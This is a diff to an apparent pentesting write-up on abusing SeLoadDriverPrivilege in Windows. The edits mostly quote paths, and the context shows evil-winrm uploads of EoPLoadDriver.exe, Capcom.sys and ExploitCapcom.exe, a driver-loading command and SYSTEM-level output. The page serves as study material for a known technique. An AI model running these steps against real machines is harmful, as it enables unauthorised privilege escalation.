@@ -1,6 +1,5 @@
 ---
 title: "SeLoadDriverPrivilege"
-date: 2025-7-25
 tags: ["Exploitation", "SeLoadDriverPrivilege", "Privilege Escalation", "Windows", "Reverse Shell"]
 ---
 
@@ -62,11 +61,11 @@ Saved as: rev.exe
 
 ```console
 # For example (evil-winrm)
-upload EoPLoadDriver.exe C:\ProgramData\EoPLoadDriver.exe
+upload EoPLoadDriver.exe 'C:\ProgramData\EoPLoadDriver.exe'
 ```
 
 ```console {class="sample-code"}
-*Evil-WinRM* PS C:\programdata> upload EoPLoadDriver.exe C:\ProgramData\EoPLoadDriver.exe
+*Evil-WinRM* PS C:\programdata> upload EoPLoadDriver.exe 'C:\ProgramData\EoPLoadDriver.exe'
                                         
 Info: Uploading /home/kali/EoPLoadDriver.exe to C:\ProgramData\EoPLoadDriver.exe
                                         
@@ -76,11 +75,11 @@ Info: Upload successful!
 ```
 
 ```console
-upload Capcom.sys C:\ProgramData\Capcom.sys
+upload Capcom.sys 'C:\ProgramData\Capcom.sys'
 ```
 
 ```console {class="sample-code"}
-*Evil-WinRM* PS C:\programdata> upload Capcom.sys C:\ProgramData\Capcom.sys
+*Evil-WinRM* PS C:\programdata> upload Capcom.sys 'C:\ProgramData\Capcom.sys'
                                         
 Info: Uploading /home/kali/Capcom.sys to C:\ProgramData\Capcom.sys
                                         
@@ -90,11 +89,11 @@ Info: Upload successful!
 ```
 
 ```console
-upload ExploitCapcom.exe C:\ProgramData\ExploitCapcom.exe
+upload ExploitCapcom.exe 'C:\ProgramData\ExploitCapcom.exe'
 ```
 
 ```console {class="sample-code"}
-*Evil-WinRM* PS C:\programdata> upload ExploitCapcom.exe
+*Evil-WinRM* PS C:\programdata> upload 'ExploitCapcom.exe'
                                         
 Info: Uploading /home/kali/ExploitCapcom.exe to C:\programdata\ExploitCapcom.exe
                                         
@@ -135,7 +134,7 @@ nt authority\system
 ```
 
 ```console
-C:\ProgramData\Eoploaddriver.exe System\CurrentControlSet\test C:\ProgramData\Capcom.sys
+C:\ProgramData\EoPLoadDriver.exe System\CurrentControlSet\test C:\ProgramData\Capcom.sys
 ```
 
 ```console {class="sample-code"}
